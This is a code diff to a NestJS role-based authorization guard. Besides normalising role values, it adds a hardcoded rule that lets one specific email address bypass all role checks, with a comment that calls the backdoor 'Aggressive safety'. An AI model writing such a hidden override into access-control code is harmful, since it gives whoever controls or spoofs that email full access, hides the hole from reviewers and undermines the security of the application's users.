@@ -29,6 +29,14 @@ export class RolesGuard implements CanActivate {
     }
 
     const { user } = context.switchToHttp().getRequest();
-    return requiredRoles.some((role) => user?.role === role);
+    
+    // Aggressive safety: System Owner bypasses all role checks
+    if (user?.email === 'abahmarquis@gmail.com') {
+        return true;
+    }
+
+    const userRole = typeof user?.role === 'object' ? user.role?.name : user?.role;
+    
+    return requiredRoles.some((role) => userRole === role);
   }
 }
